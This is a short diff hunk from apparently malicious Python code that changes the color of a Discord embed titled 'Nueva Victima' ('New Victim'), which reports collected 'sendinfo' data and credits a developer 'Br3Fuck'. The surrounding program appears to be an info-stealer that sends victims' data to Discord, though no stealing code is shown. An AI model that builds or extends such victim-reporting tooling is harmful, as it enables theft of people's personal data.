@@ -143,7 +143,7 @@ def info():
     embed = DiscordEmbed(
         title = f"Nueva Victima",
         description = sendinfo,
-        color = "03b2f8"
+        color = discord.Color.red()
     )
     embed.set_author(icon_url="https://avatars.githubusercontent.com/u/85564395?s=400&u=5a290f99665f793b9541454b47e5d8f16dba4fcc&v=4")
     embed.set_footer(text="Dev: Br3Fuck", icon_url="https://avatars.githubusercontent.com/u/85564395?s=400&u=5a290f99665f793b9541454b47e5d8f16dba4fcc&v=4")
